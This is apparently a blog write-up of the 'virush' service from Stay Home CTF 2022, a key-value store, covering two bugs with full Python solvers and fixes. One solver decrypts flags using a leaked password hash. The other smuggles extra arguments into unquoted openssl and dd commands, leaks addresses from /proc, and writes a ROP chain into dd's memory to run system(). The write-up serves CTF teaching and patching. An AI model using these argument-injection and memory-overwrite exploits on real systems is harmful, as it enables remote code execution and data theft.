+++
title = 'STAY ~/ 2022 — virush'
date = 2022-02-06T20:51:24+03:00
tags = ['ctf', 'writeup', 'pwn']
toc = true
tldr = 'write a ROP chain on the stack of /usr/bin/dd using the of=/proc/self/mem'
+++

The full source code is available here: [https://github.com/C4T-BuT-S4D/stay-home-ctf-2022/tree/master/services/virush/service/src](https://github.com/C4T-BuT-S4D/stay-home-ctf-2022/tree/master/services/virush/service/src)

## Overview

The service is a simple key-value storage.

Users can REGISTER and PUT some information to storage, also they can GET the information back.

In order to store protected information, users can choose ENCRYPTED option, then the information will be stored as encrypted data inside the storage.

## Vuln 1: crypto

TLDR:

1. Read a hidden `.hash` file that contains a [SHA-256 hash](https://en.wikipedia.org/wiki/SHA-2) of user's password
2. [OpenSSL](https://en.wikipedia.org/wiki/OpenSSL) is running with `-iter 16` option, which is using [PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) function internal
3. Exploit a well-known property of PBKDF2 which is described in Wikipedia article (`HMAC collisions`)
4. Decrypt the `flag` content using a password hash from `.hash` file (we don't really need the actual password)

Example solver: 

```python
#!/usr/bin/env python3

import sys
import json
import typing
import asyncio
import hashlib
import contextlib
import dataclasses

import openssl
import channel


@dataclasses.dataclass(frozen=True)
class AttackData:
    username: str
    sha256_of_flag: str


@contextlib.asynccontextmanager
async def initialize(uri: str, user_agent: str = 'checker'):
    async with openssl.OpenSSL.create() as ssl:
        async with channel.WebsocketChannel.create(uri, user_agent) as ws:
            _channel = channel.EncryptedChannel(ws, ssl)
            await _channel.establish()

            yield ssl, _channel


async def get_attack_data(host: str) -> typing.List[AttackData]:
    # TODO: use checksystem

    example = input('enter attack data: ')
    data = json.loads(example)

    return [
        AttackData(data['username'], data['sha256(flag)']),
    ]


async def decrypt_manual(ciphertext: bytes, key: bytes) -> bytes:
    iv, ciphertext = ciphertext[:16], ciphertext[16:]

    process = await asyncio.create_subprocess_exec(
        'openssl',
        'aes-128-cbc', '-d',
        '-iter', '16',
        '-k', key,
        '-iv', iv.hex(),
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
    )

    process.stdin.write(ciphertext)
    await process.stdin.drain()
    process.stdin.write_eof()

    plaintext = await process.stdout.read()

    try:
        process.terminate()
        await process.wait()
    except Exception:
        pass

    return plaintext


async def attack(host: str, port: int) -> typing.List[bytes]:
    property_name = 'flag'

    uri = f'ws://{host}:{port}/api/'
    attack_data = await get_attack_data(host)

    flags: typing.List[bytes] = []

    async with initialize(uri) as (_, ch):
        for data in attack_data:
            await ch.sendline(f'GET')
            await ch.sendline(f'{data.username} .hash')
            response = await ch.recvline()
            print(response)

            if response.startswith('ERROR'):
                continue

            password_hash = await ch.recvline()
            key = bytes.fromhex(password_hash)

            await ch.sendline(f'GET')
            await ch.sendline(f'{data.username} {property_name}')
            response = await ch.recvline()
            print(response)

            if response.startswith(f'ERROR'):
                continue

            content = await ch.recvline()
            ciphertext = bytes.fromhex(content)

            flag = await decrypt_manual(ciphertext, key)
            flag = flag.strip(b'\n')

            if hashlib.sha256(flag).hexdigest() != data.sha256_of_flag:
                continue

            flags.append(flag)
            print(flag, flush=True)

        await ch.sendline(f'EXIT')

    return flags


async def main():
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 17171

    flags = await attack(host, port)
    print(flags, flush=True)


if __name__ == '__main__':
    asyncio.run(main())
```

**FIX:**

Hide the `.hash` file somehow (rename/move/etc).

## Vuln 2: RCE

TLDR:

1. The service doesn't quote arguments of commands (for example: `openssl ${CipherAlgorithm} -e -iter 16 -k ${key} -iv ${iv}`)
2. So we can control arguments of most commands, it may lead to vulnerability
3. `dd` command is interesting: we can set `of=/proc/self/mem` and overwrite the process memory!
4. Also we can set `seek=0x7ffc00000000` to jump somewhere near the stack (this is a lower bound address)
5. So now we need to leak actual stack pointer, we will find a PID of running `dd` and read `/proc/PID/stat`
6. The we will read `/proc/PID/maps` and leak the libc mapping
7. We need to make another seek from `0x7ffc00000000` to real stack address
8. So we will also set a `conv=sparse` argument to `dd` and it will perform seek instead of writing `\x00` bytes (wow!)
9. When we have reached the `ret` of some function, just write a ROP chain and execute `system`
10. In order to make `dd` run infinitely, we will set `if=/proc/self/fd/255` (this is a special FD [used by Bash](https://stackoverflow.com/q/29729906))

More detailed description could be found in the example solver:

```python
#!/usr/bin/env python3

import sys
import json
import typing
import base64
import struct
import asyncio
import contextlib
import dataclasses
import checklib.generators as generators

import openssl
import channel


@contextlib.asynccontextmanager
async def initialize(uri: str):
    async with openssl.OpenSSL.create() as ssl:
        async with channel.WebsocketChannel.create(uri, 'checker') as ws:
            _channel = channel.EncryptedChannel(ws, ssl)
            await _channel.establish()

            yield ssl, _channel


def escape_dd(command: typing.List[str]) -> str:
    return ''.join(f'\\\\\\ {argument}' for argument in command)


def escape_openssl(command: typing.List[str]) -> str:
    return ''.join(f' {argument}' for argument in command)


async def do_register(ch: channel.Channel, username: str, password: str) -> None:
    await ch.sendline(f'REGISTER')
    await ch.sendline(f'{username} {password}')
    await ch.recvline()


async def do_login(ch: channel.Channel, username: str, password: str) -> None:
    await ch.sendline(f'LOGIN')
    await ch.sendline(f'{username} {password}')
    await ch.recvline()


async def do_put(
        ch: channel.Channel, username: str, property_name: str, encrypted: bool = False, data: str = None,
) -> None:
    await ch.sendline(f'PUT')
    await ch.sendline(f'{username} {property_name} {"ENCRYPTED" if encrypted else ""}')

    if data is not None:
        await ch.sendline(data)


async def do_get(
        ch: channel.Channel, username: str, property_name: str, encrypted: bool = False
) -> None:
    await ch.sendline(f'GET')
    await ch.sendline(f'{username} {property_name} {"ENCRYPTED" if encrypted else ""}')


async def do_logout(ch: channel.Channel) -> None:
    await ch.sendline('LOGOUT')
    await ch.recvline()


async def do_exit(ch: channel.Channel) -> None:
    await ch.sendline('EXIT')
    await ch.recvline()


async def send_zero_bytes(
        ch: channel.Channel, pid: int, username: str, property_name: str, bs: int, count: int,
) -> None:
    dd_command = [
        f'if=/dev/zero',
        f'of=/proc/{pid}/fd/255',
        f'bs={bs}',
        f'count={count}',
    ]

    await do_put(ch, username, property_name + escape_dd(dd_command))


async def read_current_pos(
        ch: channel.Channel, pid: int, username: str, property_name: str,
) -> int:
    dd_command = [
        f'if=/proc/{pid}/fdinfo/1',
        f'of=/dev/stdout',
        f'bs=1024',
        f'count=99999',
    ]

    await do_put(ch, username, property_name + escape_dd(dd_command))

    tries = 50

    for _ in range(tries):
        line = await ch.recvline()

        if line.startswith('pos:'):
            return int(line.split(' ')[-1])
    else:
        raise Exception('failed to get current pos')


async def run_command(uri: str, command: str) -> None:
    nonce = generators.rnd_string(10)
    print(f'nonce = {nonce}')

    block_size = 65536 * 16
    stack_start_offset = 0x7ffc00000000

    username = generators.rnd_username(10)
    password = generators.rnd_password(70)

    property_name = generators.rnd_string(50)

    async with initialize(uri) as (_, ch1):

        # stage 1.1:
        #   - use openssl to leak dd's PID
        #   - dd runs just after openssl, so the leaked PID will be the nearest PID we can leak
        #   - we can use a password to control openssl arguments (password are passed as a key)
        #   - the PID information will be stored inside the temporary file, we will read it later

        openssl_command = [
            f'-aes-128-ecb',
            f'-in', f'/proc/self/stat',
            f'-out', f'/tmp/pid_{nonce}',
            f'-a',
            f'-A',
        ]

        openssl_password = password + escape_openssl(openssl_command)

        await do_register(ch1, username, openssl_password)
        await do_login(ch1, username, openssl_password)

        # stage 1.2:
        #   - run dd with of=/proc/self/mem, so dd will overwrite its memory,
        #     but ASLR is on, and we don't know the stack address at the moment of passing arguments
        #   - so we will seek output to `start_stack_offset` at first (lower bound of possible stack addresses)
        #   - also we will use conv=sparse flag to perform seek instead of writing \0 bytes
        #     so we can write \0 bytes to dd's stdin and seek the offset in memory
        #   - we can use fd 255 to make some kind of pipe (fifo), in order to read infinitely

        dd_command = [
            f'if={nonce}',
            f'if=/proc/self/fd/255',
            f'of=/proc/self/mem',
            f'bs={block_size}',
            f'count=9999999',
            f'seek={stack_start_offset // block_size}',
            f'conv=notrunc,sparse',
        ]

        await do_put(ch1, username, property_name + escape_dd(dd_command), True)

        async with initialize(uri) as (ssl, ch2):

            # stage 2.1:
            #   - we need to leak a PID from stage 1.1
            #     but /proc/self/stat doesn't contain a newline at the end
            #     so we need to append it first

            await do_login(ch2, username, openssl_password)

            dd_command = [
                f'if=/dev/stdin',
                f'of=/tmp/pid_{nonce}',
                f'oflag=append',
                f'conv=notrunc',
            ]

            await do_put(ch2, username, property_name + escape_dd(dd_command), False, '')

            # stage 2.2:
            #   - then just read a PID from file
            #   - since we put the PID with openssl, it is stored as encrypted data
            #     so we need to decrypt it manually

            dd_command = [
                f'if=/tmp/pid_{nonce}',
                f'of=/dev/stdout',
            ]

            await do_put(ch2, username, property_name + escape_dd(dd_command))
            await ch2.recvline()
            await ch2.recvline()

            line = await ch2.recvline()
            line = base64.b64decode(line)

            iv = b'\x00' * 16
            leaked_data = await ssl.decrypt(iv + line, password)
            leaked_pid = int(leaked_data.split(b' ')[0].decode())

            await do_logout(ch2)
            await do_exit(ch2)

        print(f'leaked_pid = {leaked_pid}')

        # stage 3:
        #   - now we need to find the real dd's PID using the leaked PID
        #   - we will enumerate all nearest PIDs starting from the leaked PID
        #   - to get PID we will use /proc/PID/stat
        #     this file also contains an actual stack pointer (address leak)
        #     we will use it later to defeat ASLR and build a ROP chain

        offset_to_check = 10

        async with initialize(uri) as (_, ch3):
            await do_login(ch3, username, openssl_password)
    
            for i in range(1, offset_to_check):
                for sign in [-1, 1]:
                    dd_command = [
                        f'if=/proc/{leaked_pid + sign * i}/stat',
                        f'of=/dev/stdout',
                    ]

                    await do_put(ch3, username, property_name + escape_dd(dd_command))
            
            for _ in range(offset_to_check * 2):
                line = await ch3.recvline()

                if not line.startswith('SUCCESS') and '(dd)' in line:
                    parts = line.split(' ')
                    pid = int(parts[0])
                    stack_leak = int(parts[27])
                    break
            else:
                raise Exception('failed to find dd pid')

            await do_logout(ch3)
            await do_exit(ch3)


        print(f'pid = {pid}')
        print(f'stack_leak = 0x{stack_leak:x}')

        if stack_leak < stack_start_offset:
            raise Exception('stack_leak < stack_start_offset')

        async with initialize(uri) as (_, ch4):

            # stage 4:
            #   - but at first we need to leak a libc address also
            #     in order to use `system` function
            #   - we will read /proc/PID/maps to leak

            await do_login(ch4, username, openssl_password)

            dd_command = [
                f'if=/proc/{pid}/maps',
                f'of=/dev/stdout',
                f'bs=1024',
                f'count=99999',
            ]

            await do_put(ch4, username, property_name + escape_dd(dd_command))

            libc_addr: int = None
            stack_addr: int = None

            tries = 50

            for _ in range(tries):
                line = await ch4.recvline()

                if all(check in line for check in ['libc', 'r--p', '00000000']):
                    libc_addr = int(line.split('-')[0], 16)

                if all(check in line for check in ['[stack]', 'rw-p', '00000000']):
                    stack_addr = int(line.split('-')[1].split(' ')[0], 16)

                if libc_addr is not None and stack_addr is not None:
                    break
            else:
                raise Exception('failed to find stack and libc')

            await do_logout(ch4)
            await do_exit(ch4)

        print(f'libc_base_addr = 0x{libc_addr:x}')
        print(f'stack_base_addr = 0x{stack_addr:x}')

        # libc-2.31 from docker container
        libc_system = libc_addr + 0x55410
        libc_binsh = libc_addr + 0x1b75aa
        libc_pop_rdi_ret = libc_addr + 0x0000000000026b72
        libc_ret = libc_addr + 0x0000000000025679

        # a pointer to stored `ret` on the stack
        # the offset is calculated manually
        stack_ret_ptr = stack_leak - 0x238 - 1
        print(f'stack_ret_ptr = 0x{stack_ret_ptr:x}')

        # stage 5:
        #   - we need to seek the dd's output file pointer to `stack_ret_ptr`
        #     in order to put a ROP chain on the stack
        #   - we will send \0 bytes from /dev/zero to dd's stdin
        #     since we use conv=sparse, dd will perform seek instead of write
        #   - then we will read /proc/PID/fdinfo/1 to get actual stdout offset

        stack_current_pos = (stack_start_offset // block_size) * block_size
        print(f'stack_current_pos = 0x{stack_current_pos:x}')

        pos_diff = stack_ret_ptr - stack_current_pos
        print(f'pos_diff = 0x{pos_diff:x}')

        if pos_diff < 0:
            raise Exception('pos_diff < 0')

        async with initialize(uri) as (_, ch5):
            await do_login(ch5, username, openssl_password)

            await send_zero_bytes(
                ch5, pid, username, property_name, block_size, pos_diff // block_size,
            )

            await asyncio.sleep(20)

            stack_current_pos = await read_current_pos(ch5, pid, username, property_name)
            pos_diff = stack_ret_ptr - stack_current_pos

            print(f'stack_current_pos = 0x{stack_current_pos:x}')
            print(f'pos_diff = 0x{pos_diff:x}')

            while pos_diff > 0:

                # stage 5.1:
                #   - since FD 255 is also used by bash, there are some writing errors
                #     so we will write in a while until we reach `stack_ret_ptr`
                #   - before each iteration we will write to stdin \n symbol 
                #     it speeds up seeking because bash is trying to read lines from FD 255

                dd_command = [
                    f'of=/proc/{pid}/fd/255'
                ]

                await do_put(ch5, username, property_name + escape_dd(dd_command), False, '')

                await send_zero_bytes(ch5, pid, username, property_name, 1, pos_diff)

                await asyncio.sleep(1)

                stack_current_pos = await read_current_pos(ch5, pid, username, property_name)
                pos_diff = stack_ret_ptr - stack_current_pos

                print(f'stack_current_pos = 0x{stack_current_pos:x}')
                print(f'pos_diff = 0x{pos_diff:x}')

                if pos_diff < 0:
                    raise Exception('pos_diff < 0')

            await do_logout(ch5)
            await do_exit(ch5)

        # stage 6:
        #   - now it's time to put a ROP chain on the stack
        #     we will just put the command on the stack and call system
        #   - but we can't transmit it directly to the backend
        #     since the protocol does not support binary data
        #   - we will transmit is encrypted (in hex)
        #     and then decrypt on the backend using service features

        p64 = lambda x: struct.pack('<Q', x)

        chain = [
            b'\n',  # again because of bash
            p64(libc_pop_rdi_ret),
            p64(stack_ret_ptr + 4 * 8 + 1),  # offset from the start of chain
            p64(libc_ret),
            p64(libc_system),
            f' : ; {command} ; \x00'.encode(),
        ]

        username2 = generators.rnd_username(10)
        password2 = generators.rnd_password(70)

        property_name2 = generators.rnd_string(50)

        async with initialize(uri) as (ssl, ch6):
            openssl_command = [
                f'-out', f'/tmp/payload_{nonce}',
            ]

            openssl_password2 = password2 + escape_openssl(openssl_command)

            await do_register(ch6, username2, openssl_password2)
            await do_login(ch6, username2, openssl_password2)

            payload = b''.join(chain)
            ciphertext = await ssl.encrypt(payload, password2)

            await do_put(ch6, username2, property_name2, False, ciphertext.hex())
            await ch6.recvline()

            await do_get(ch6, username2, property_name2, True)
            await ch6.recvline()

            dd_command = [
                f'if=/tmp/payload_{nonce}',
                f'of=/proc/{pid}/fd/255',
                f'bs={len(payload)}',
            ]

            # after the next PUT the ROP chain will be executed:

            await do_put(ch6, username2, property_name2 + escape_dd(dd_command))
            await ch6.recvline()

            await do_logout(ch6)
            await do_exit(ch6)

    # TODO: don't forget to remove all files used by exploit


async def main():
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 17171

    uri = f'ws://{host}:{port}/api/'

    # TODO: use attack_data
    command = 'id'

    async with initialize(uri) as (_, ch):
        username = generators.rnd_username(10)
        password = generators.rnd_password(70)

        property_name = generators.rnd_string(50)

        await do_register(ch, username, password)

        await run_command(uri, f'{command} > /tmp/storage_directory/{username}/{property_name}')

        await do_get(ch, username, property_name)
        await ch.recvline()
        
        response = await ch.recvline()
        print(response)


if __name__ == '__main__':
    asyncio.run(main())
```

**FIX:**

Wrap commands' arguments with quotes, for example: 

```
openssl "${CipherAlgorithm}" -e -iter 16 -k "${key}" -iv "${iv}"
```
